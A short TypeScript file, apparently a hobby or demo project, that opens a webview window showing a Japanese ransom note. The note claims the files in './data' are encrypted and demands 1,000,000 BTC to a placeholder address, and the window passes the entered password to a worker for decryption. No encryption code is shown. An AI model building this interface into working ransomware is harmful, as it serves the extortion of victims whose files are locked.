import { Webview, SizeHint } from 'webview'
import html from "../utils/html2b64url.ts"

const app = new Webview()

app.navigate(html`<!doctype HTML>
  <html>
    <head>
      <meta charset="utf-8">
    </head>
    <body>
      <h1>マルウェア!!</h1>
      <p>このパソコンの"./data"ディレクトリの中のデータ全てが暗号化されました。</p>
      <p>暗号化を解除するには、パスワードを入力してください</p>
      <p>パスワードは、メールアドレスexample@example.comに1000000BTCを送金してくれたら、教えてあげます。</p>
      <label>
        パスワード:
        <input type="" id="password">
      </label>
      <button onclick="sendPassword(document.getElementById('password').value)">復号!!</button>
      <div id="log"></div>
      <script>
        const showLog = (data) => {
          document.getElementById('log').innerHTML = data
        }
        const randColor = () => '#' + Math.random().toString(16).slice(2, 8)
        setInterval(() => {
          document.body.style.background = 'linear-gradient(' + randColor() + ',' + randColor() + ')'
        }, 1000)
      </script>
    </body>
  </html>
  `)

app.bind('sendPassword', (data: string) => {
  (self as typeof self & {
    postMessage (data: any): void
  }).postMessage({
    password: data,
    type: 'pls_dec'
  })
})

app.title = 'マルウェア!!'
app.size = {
  width: 1000,
  height: 500,
  hint: SizeHint.NONE
}

app.run()